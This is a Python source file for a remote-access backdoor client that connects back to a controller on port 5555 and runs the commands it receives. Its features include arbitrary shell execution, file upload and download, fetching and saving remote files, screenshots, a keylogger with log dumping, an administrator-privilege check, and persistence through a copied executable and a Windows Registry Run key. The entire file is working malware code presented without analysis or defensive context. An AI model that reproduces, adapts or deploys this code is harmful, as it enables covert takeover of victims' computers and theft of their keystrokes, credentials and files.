import socket
import json
import subprocess
import time
import os
import threading
import shutil
import sys
from sys import platform
from mss import mss
import requests
import keylogger


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, "wb")
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, "rb")
    s.send(f.read())


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def screenshot():
    if platform == "win32" or platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, ".screen.png")
    elif platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, ".screen.png")


def persist(reg_name, copy_name):
    file_location = os.environ["appdata"] + "\\" + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
                + reg_name
                + ' /t REG_SZ /d "'
                + file_location
                + '"',
                shell=True,
            )
            reliable_send("[+] Created Persistence With Reg Key: " + reg_name)
        else:
            reliable_send("[+] Persistence Already Exists")
    except:
        reliable_send("[-] Error Creating Persistence With The Target Machine")


def is_admin():
    global admin
    if platform == "win32":
        try:
            temp = os.listdir(
                os.sep.join([os.environ.get("SystemRoot", "C:\windows"), "temp"])
            )
        except:
            admin = "[!!] User Privileges!"
        else:
            admin = "[+] Administrator Privileges!"
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        pass
        # TO BE DONE


def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command in ["background", "help", "clear"]:
            pass
        elif command.startswith("cd "):
            os.chdir(command[3:])
        elif command.startswith("upload"):
            download_file(command[7:])
        elif command.startswith("download"):
            upload_file(command[9:])
        elif command.startswith("get"):
            try:
                download_url(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[!!] Download Failed!")
        elif command.startswith("screenshot"):
            screenshot()
            upload_file(".screen.png")
            os.remove(".screen.png")
        elif command.startswith("keylog_start"):
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send("[+] Keylogger Started!")
        elif command.startswith("keylog_dump"):
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command.startswith("keylog_stop"):
            keylog.self_destruct()
            t.join()
            reliable_send("[+] Keylogger Stopped!")
        elif command.startswith("persistence"):
            persist(*command[12:].split(" "))
        elif command.startswith("sendall"):
            subprocess.Popen(
                command[8:],
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
        elif command.startswith("check"):
            try:
                is_admin()
                reliable_send(f"{admin} platform: {platform}")
            except:
                reliable_send(f"Cannot Perform Privilege Check! Platform: {platform}")
        elif command.startswith("start"):
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[-] Failed to start!")
        else:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True
            )
            reliable_send(result)


def connection():
    while True:
        time.sleep(5)
        try:
            s.connect(("127.0.0.1", 5555))
            shell()
            s.close()
            break
        except:
            connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
